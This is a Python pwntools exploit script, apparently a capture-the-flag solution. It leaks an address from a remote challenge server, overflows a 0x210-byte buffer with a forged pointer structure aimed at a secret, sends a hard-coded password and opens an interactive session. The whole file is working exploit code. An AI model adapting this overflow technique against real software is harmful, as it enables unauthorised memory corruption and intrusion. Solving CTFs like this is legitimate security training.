from pwn import *

context.terminal = ['tmux','splitw','-h']
context.arch = 'amd64'

# r = process("./chal")
r = remote("edu-ctf.zoolab.org",30216)


r.recvuntil("0x")
note_buf = int(r.recvline(),base=16)
debug_secret = note_buf - 0x30
print("note_buf",hex(note_buf))
print("flag_addr",hex(debug_secret))

r.sendlineafter(">","1")
r.sendlineafter(">","2")


payload = flat(
    0,0,
    0,0,
    0,0,
    0,debug_secret,
    debug_secret+0x10,0,
    0,0,
    0,0,
    0
)

r.sendlineafter("data>",b"A"*0x210+payload)
r.sendlineafter(">","4")
r.sendline("gura_50_cu73\x00")

# gdb.attach(r)

r.interactive()

